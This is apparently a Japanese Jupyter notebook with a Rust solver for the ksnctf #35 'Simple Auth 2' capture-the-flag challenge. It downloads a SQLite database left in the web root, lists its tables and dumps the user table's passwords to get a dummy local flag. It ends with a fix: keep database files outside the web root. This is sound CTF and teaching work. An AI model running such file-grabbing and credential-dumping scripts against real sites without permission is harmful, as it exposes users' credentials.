# ksnctf #35 Simple Auth 2 — Rust ソルバー

## 脆弱性の核心

```php
$db = new PDO('sqlite:database.db');
```

`database.db` が Web ルート直下に置かれているため、  
URL を `auth.php` → `database.db` に変えるだけで **DB ファイルが丸ごとダウンロードできる**。

## 攻略ステップ
1. `database.db` を HTTP GET で取得
2. SQLite として開き `user` テーブルを全件 SELECT
3. `password` カラムの値がそのままフラグ

## evcxr (Jupyter Rust kernel) の注意点
- メソッドチェーンの戻り値は型推論が効かないため **`let` に明示的な型注釈**が必要
- `?` 演算子は使えないため `.unwrap()` / `.expect()` を使う
- `Connection` / `Statement` はセルをまたいで借用できないため **同一セルにまとめる**


In [2]:
// ── セル 1: クレート宣言（初回のみ数分かかります） ──────────────────────
:dep rusqlite = { version = "0.31", features = ["bundled"] }
:dep reqwest  = { version = "0.12", features = ["blocking"] }

In [8]:
// ── セル 2: database.db をダウンロードして保存 ──────────────────
use std::fs;

println!("=== ksnctf #35 Simple Auth 2 Solver ===");
println!("[*] Downloading database.db ...");

// ローカル Docker 環境の場合は localhost:8080、本番は ctfq.u1tramarine.blue/q35
let url: &str = "http://localhost:8080/database.db";
// let url: &str = "http://ctfq.u1tramarine.blue/q35/database.db";

// evcxr は型推論が弱いため data に明示的な型注釈を付ける
let data: Vec<u8> = reqwest::blocking::get(url)
    .expect("HTTP request failed")
    .bytes()
    .expect("Failed to read response bytes")
    .to_vec();

// Windows/Linux 両方で動くよう、カレントディレクトリに保存する
let db_path: &str = "./database.db";

// data.as_ref() ではなく &data に修正して型を明確にする
fs::write(db_path, &data).expect("Failed to write database.db");

println!("[+] {} bytes saved to {}", data.len(), db_path);

=== ksnctf #35 Simple Auth 2 Solver ===
[*] Downloading database.db ...
[+] 12288 bytes saved to ./database.db


In [10]:
// ── セル 3: テーブル一覧を表示 ──────────────────────────────────────────
// evcxr のライフタイム制限を回避するため、全体をブロック {} で囲みます
{
    use rusqlite::Connection;

    // パスを ./database.db に修正
    let conn: Connection = Connection::open("./database.db")
        .expect("Failed to open database.db");

    let mut stmt = conn.prepare("SELECT name FROM sqlite_master WHERE type='table'")
        .expect("Failed to prepare statement");

    let tables: Vec<String> = stmt.query_map([], |row| row.get::<_, String>(0))
        .expect("query_map failed")
        .filter_map(|r| r.ok())
        .collect::<Vec<String>>();

    println!("[*] Tables in database:");
    for t in &tables {
        println!("    - {}", t);
    }
}

[*] Tables in database:
    - user


()

In [12]:
// ── セル 4: user テーブルを全件ダンプ → フラグ取得 ──────────────────────
// evcxr のライフタイム制限を回避するため、全体をブロック {} で囲みます
{
    use rusqlite::Connection;

    // パスを /tmp/database.db から ./database.db に修正
    let conn2: Connection = Connection::open("./database.db")
        .expect("Failed to open database.db");

    let mut stmt2 = conn2.prepare("SELECT id, password FROM user")
        .expect("Failed to prepare statement");

    // タプルのベクタとして全行を収集（イテレータをセルをまたいで保持しない）
    let rows: Vec<(String, String)> = stmt2.query_map([], |row| {
        let id: String = row.get::<_, String>(0)?;
        let password: String = row.get::<_, String>(1)?;
        Ok((id, password))
    })
    .expect("query_map failed")
    .filter_map(|r| r.ok())
    .collect::<Vec<(String, String)>>();

    println!("{:<20} {}", "id", "password");
    println!("{}", "-".repeat(50));

    let mut flag: String = String::new();
    for (id, password) in &rows {
        println!("{:<20} {}", id, password);
        if password.starts_with("FLAG_") || password.contains("FLAG") {
            flag = password.clone();
        }
    }

    println!();
    if flag.is_empty() {
        println!("[!] FLAG_ prefix not found — check password column above");
    } else {
        println!("=============================");
        println!("  FLAG: {}", flag);
        println!("=============================");
    }
}

id                   password
--------------------------------------------------
admin                FLAG_LocalTestDummyFlag_ChangeMe

  FLAG: FLAG_LocalTestDummyFlag_ChangeMe


()

## なぜブルートフォースが悪手か

| 手法 | 理由 |
|------|------|
| SQL インジェクション | PDO プリペアドステートメントで完全に防いでいる |
| ブルートフォース | 時間・サーバー負荷のリスクがある上、**そもそも不要** |
| **DB ファイル直接取得** ✅ | `sqlite:database.db` が Web ルートに公開されているため 1 リクエストで完結 |

**教訓**: DB ファイルは Web ルート外に置くか、Apache `<Files>` ディレクティブでアクセスを拒否する。
